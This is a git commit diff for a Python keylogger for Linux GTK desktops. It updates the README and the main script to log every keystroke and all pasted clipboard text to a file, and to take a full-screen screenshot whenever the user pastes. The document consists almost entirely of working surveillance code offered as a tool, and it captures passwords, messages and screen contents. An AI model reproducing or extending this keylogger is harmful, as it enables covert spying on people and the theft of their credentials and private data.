8568e7a47373cbd304bfbeec7cf1fbb6a7fa783c
Anubhav <anubhavdas54@gmail.com>
2019-07-16 22:38:39 +0530

    Added screenshot feature

--- README.md
+++ README.md
@@ -1,4 +1,13 @@
-# linux_keylogger
-Linux keylogger in Python with clipboard logging functionality for GTK.
+# XKeylogger
+Keylogger for Linux with GTK+ 3 based desktop environments such as GNOME, XFCE, LXDE etc.
 
-It uses [pyxhook](https://github.com/JeffHoogland/pyxhook) for capturing keystrokes.
+## Features
+* Keystrokes logging
+* Clipboard logging
+* Screenshot after every paste (Ctrl+V)
+
+## Requirements
+
+* [pyxhook](https://github.com/JeffHoogland/pyxhook) (Included)
+* [python-xlib](https://github.com/python-xlib/python-xlib)
+* [PyGObject](https://github.com/GNOME/pygobject)
--- keylogger.py
+++ keylogger.py
@@ -1,10 +1,26 @@
+import os
+import atexit
 import pyxhook
 import gi
 gi.require_version('Gtk', '3.0')
+gi.require_version('Gdk', '3.0')
 from gi.repository import Gtk, Gdk
 
+# Log file
 log_file = 'log.txt'
+log_fh = open(log_file, 'a')
+
+# Clipboard
 cb = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)
+
+# Screenshot
+os.makedirs("screenshots", exist_ok=True)
+win = Gdk.get_default_root_window()
+h = win.get_height()
+w = win.get_width()
+
+# State of the Ctrl key, req. for detecting paste operation
+ctrl_set = 0
 
 special_keys = ['Shift_L', 'Shift_R', 'Control_L', 'Control_R',
                 'Alt_L', 'Alt_R', 'Super_L', 'Super_R',
@@ -23,50 +39,96 @@ symbols = {'grave': '`', 'asciitilde': '~', 'exclam': '!', 'at': '@', 'numbersig
            'slash': '/', 'question': '?'}
 
 
-def kb_event(event):
+# On exit tasks
+def exit_handler():
+    log_fh.close()
+
+
+atexit.register(exit_handler)
+
+
+def on_keyboard_event(event):
 
     global ctrl_set
 
-    f = open(log_file, 'a')
-
     try:
+        # Enter key
         if event.Key == 'Return':
-            f.write("\n")
+            log_fh.write("\n")
 
         elif event.Key == 'space':
-            f.write(" ")
+            log_fh.write(" ")
 
         elif event.Key == 'BackSpace':
-            f.write("<-")
+            log_fh.write("<-")
 
         elif event.Key == 'v' or event.Key == 'V':
             content = cb.wait_for_text()
+            # Paste operation
             if ctrl_set == 1:
-                f.write("Paste: " + content)
+                # Take a screenshot
+                pb = Gdk.pixbuf_get_from_window(win, 0, 0, w, h)
+                if pb is not None:
+                    pb.savev("screenshots/ss{}.png".format(get_ss_count()), "png", (), ())
+                # Log clipboard content
+                log_fh.write("Paste: " + str(content))
 
             else:
-                f.write(event.Key)
+                log_fh.write(event.Key)
 
+        # To differentiate the special key presses from normal text
         elif event.Key in special_keys:
-            f.write("<" + event.Key + ">")
+            log_fh.write("<" + event.Key + ">")
             if event.Key.startswith('Control'):
+                # Set ctrl_set = 1 and exit the function
                 raise ValueError
 
+        # Write the actual symbols instead of names
         elif event.Key in symbols:
-            f.write(symbols.get(event.Key))
+            log_fh.write(symbols.get(event.Key))
 
         else:
-            f.write(event.Key)
+            log_fh.write(event.Key)
 
         ctrl_set = 0
 
     except ValueError:
         ctrl_set = 1
 
-def main():
-    hookman = pyxhook.HookManager()
-    hookman.KeyDown = kb_event
-    hookman.HookKeyboard()
-    hookman.start()
 
-if __name__ == "__main__": main()
+def get_ss_count():
+    # Create file if not exists
+    try:
+        fh = open("screenshots/ss_count.txt", "x")
+        fh.write("1")
+        fh.close()
+        return 0
+    except FileExistsError:
+        # Read count
+        fh = open("screenshots/ss_count.txt", "r")
+        count = fh.readline()
+        fh.close()
+        try:
+            count = int(count.strip())
+        # If count value gets corrupted, set to 1
+        except ValueError:
+            fh = open("screenshots/ss_count.txt", "w")
+            fh.write("1")
+            fh.close()
+            return 0
+        # Write count + 1
+        fh = open("screenshots/ss_count.txt", "w")
+        fh.write("{}".format(count + 1))
+        fh.close()
+        return count
+
+
+def main():
+    hook_man = pyxhook.HookManager()
+    hook_man.KeyDown = on_keyboard_event
+    hook_man.HookKeyboard()
+    hook_man.start()
+
+
+if __name__ == "__main__":
+    main()
